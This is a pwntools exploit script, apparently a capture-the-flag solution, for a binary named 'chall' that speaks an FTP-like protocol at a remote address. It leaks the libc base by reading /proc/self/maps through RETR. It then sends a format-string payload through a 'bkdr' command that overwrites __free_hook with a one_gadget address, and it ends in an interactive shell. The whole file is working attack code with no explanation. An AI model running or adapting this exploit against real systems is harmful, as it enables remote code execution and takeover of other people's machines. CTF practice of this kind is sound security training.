from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./chall")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.61.84", 50326)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.writeline("USER ;)")
io.writeline("PASS ;)")

"""
io.recv()
#input("PAUSE")

for i in range(1, 3000): # 3000
    io.sendline(f"bkdr ABCD.%{i}$p")
    io.recvuntil("431136 bkdr")
    print(i, io.recvline().strip())
"""

io.recv()

io.writeline(b"RETR /proc/self/maps")

for _ in range(9): # En remote 10
    io.recvline()

libc.address = int(io.recvline().strip().decode()[0:12], 16)

print(f"Libc Base: {hex(libc.address)}")
print(f"Free Hook: {hex(libc.sym.__free_hook)}")


one_gadget = [0xde78c, 0xde78f, 0xde792]

writes_dict = {
    libc.sym.__free_hook: libc.address + one_gadget[1]
}

offset = 1031

payload = fmtstr_payload(offset, writes_dict, numbwritten=12)

io.writeline(b"bkdr " + payload)

io.interactive()